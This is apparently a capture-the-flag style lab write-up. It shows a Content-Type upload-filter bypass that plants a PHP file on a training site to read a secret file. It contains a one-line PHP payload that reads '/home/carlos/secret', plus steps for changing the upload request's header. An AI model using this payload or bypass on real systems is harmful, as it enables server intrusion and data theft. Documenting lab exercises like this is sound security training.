# Web shell upload via Content-Type restriction bypas
* This lab contains a vulnerable image upload function. It attempts to prevent users from uploading unexpected file types, but relies on checking user-controllable input to verify this.
	* To solve this lab, upload a basic PHP web shell and us it to exfiltrate the contents of the file `/home/carlos/secret`. Submit this secret using the button provided in the lab banner.
	* You can log in to your own account using the following credentials `wiener:peter`
### 1. Make a PHP payload to exfilterate the target file
* The file is saved as "file.php"
```php
<?php echo file_get_contents('/home/carlos/secret'); ?>
```
### 2. Try to uplaod the malicious PHP file
* Login as wiener and a file upload panel is found on "My account".

![86](https://user-images.githubusercontent.com/53956303/152077758-52fefe38-be4d-4b9b-a3b5-4ab3df5a32e3.png)
* When upload the PHP file, it returns an error message.

![87](https://user-images.githubusercontent.com/53956303/152077894-02586a86-f353-4a88-8f53-34f3841ce2c6.png)
### 3. Capture the request when upload the file and modify the request using repeater
* Since the error message mentioned that only _image/jpeg_ and _image/png_ is acceptable, change the Content-Type from _application/x-php_ to _image/png_
	* As a result, the file is successfully uploaded.

![88](https://user-images.githubusercontent.com/53956303/152078215-768ce8ba-bf63-477a-a40e-a315a55ad87a.png)
### 4. Execute the uploaded PHP web shell
* From the image info, the file location is found

![89](https://user-images.githubusercontent.com/53956303/152078349-555a50b4-1977-49ae-b0ad-da0e41300e35.png)
* Execute the file by navigate using a browser
	* As a result, the secret key is given.

![90](https://user-images.githubusercontent.com/53956303/152078468-27907cf4-8b00-4d07-a037-45ea780adda4.png)
* By submmitting the key, the lab is solved

![91](https://user-images.githubusercontent.com/53956303/152078562-649fd014-98ff-489c-bf1d-ce2eefe2c686.png)
